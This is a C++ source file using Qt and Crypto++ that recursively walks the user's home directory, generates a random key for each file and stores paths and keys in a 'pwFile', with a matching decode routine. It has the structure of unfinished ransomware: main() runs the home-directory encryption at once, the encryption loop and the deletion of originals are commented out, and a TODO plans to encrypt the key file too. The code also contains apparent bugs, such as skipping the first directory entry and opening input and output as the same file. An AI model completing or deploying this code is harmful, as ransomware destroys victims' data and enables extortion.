#include <osrng.h>
#include <QDir>
#include <QFile>
#include <ring.hpp>

void encodeDir(QDir& dir, QFile& pwFile);
void encodeFile(QFile& file, QFile& pwFile);
void encodeHome();
void decodeHome();

void encodeDir(QDir& dir, QFile& pwFile)
{
	dir.setFilter(QDir::NoDotAndDotDot | QDir::Dirs | QDir::Files);
	QList<QFileInfo> files = dir.entryInfoList();
	for (int i=1; i<files.length(); i++)
	{
		QFileInfo file = files.at(i);
		if (file.isFile() && file.isReadable() && !file.absoluteFilePath().endsWith(".enc"))
		{
			QFile fil(file.absoluteFilePath());
			encodeFile(fil, pwFile);
		}
		else if (file.isDir() && file.isReadable())
		{
			QDir dir(file.absoluteFilePath());
			encodeDir(dir, pwFile);
		}
	}
}

void encodeFile(QFile& file, QFile& pwFile)
{
	QFile out(QFileInfo(file).absoluteFilePath()+".enc");
	if (out.exists() || !out.isWritable())
	{
		return;
	}
	char* pw[256];
//	char* salt[1024];
	CryptoPP::AutoSeededRandomPool rng;
	rng.GenerateBlock((byte*)pw, 256);
//	rng.GenerateBlock((byte*)salt, 1024);
/*	out.open(QIODevice::WriteOnly);
	out.write((const char*)salt, 1024);
	Ring ring((const unsigned char*)pw, 256, (const unsigned char*)salt, 1024, 16);
	unsigned int treated = 0;
	char buf[1024];
	file.open(QIODevice::ReadOnly);
	while (treated < file.size())
	{
		unsigned int readSize = 1024;
		if (treated+readSize >= file.size())
		{
			readSize = file.size()-treated;
		}
		file.read(buf, readSize);
		ring.encode((unsigned char*)buf, readSize);
		out.write(buf, readSize);
		treated += readSize;
	}
	file.close();
	out.close();*/
	pwFile.write(QFileInfo(out).absoluteFilePath().toStdString().c_str());
	char newline = '\n';
	pwFile.write(&newline, 1);
	pwFile.write((const char*)pw, 256);
	pwFile.write(&newline, 1);
	pwFile.flush();
	//file.remove();
}

void encodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "pwFile");
assert(!pwFile.exists());
	pwFile.open(QIODevice::WriteOnly);
	QDir dir = QDir::home();
	encodeDir(dir, pwFile);
	pwFile.close();
//TODO encode pwFile
}

void decodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "pwFile");
assert(pwFile.exists());
	pwFile.open(QIODevice::ReadOnly);
//TODO decode pwFile
	unsigned int treated = 0;
	while (treated < pwFile.size())
	{
		char filename[1024];
		char outfilename[1024];
		treated += pwFile.readLine(filename, 1024);
		strcpy(outfilename, filename);
		outfilename[strlen(outfilename)-3] = '\0';
		treated += pwFile.seek(pwFile.pos()+1);
		char pw[256];
		treated += pwFile.read(pw, 256);
		treated += pwFile.seek(pwFile.pos()+1);
		QFile in(filename);
		in.open(QIODevice::ReadOnly);
		QFile out(filename);
		out.open(QIODevice::WriteOnly);
		char salt[1024];
		unsigned int inTreated = 0;
		inTreated += in.read(salt, 1024);
		Ring ring((const unsigned char*)pw, 256, (const unsigned char*)salt, 1024, 16);
		while (inTreated < in.size())
		{
			unsigned int readSize = 1024;
			if (inTreated+readSize >= in.size())
			{
				readSize = in.size()-inTreated;
			}
			char buf[readSize];
			in.read(buf, readSize);
			ring.decode((unsigned char*)buf, readSize);
			out.write(buf, readSize);
			inTreated += readSize;
		}
		in.close();
		out.close();
		in.remove();
	}
	pwFile.close();
	pwFile.remove();
}

int main()
{
	encodeHome();
}
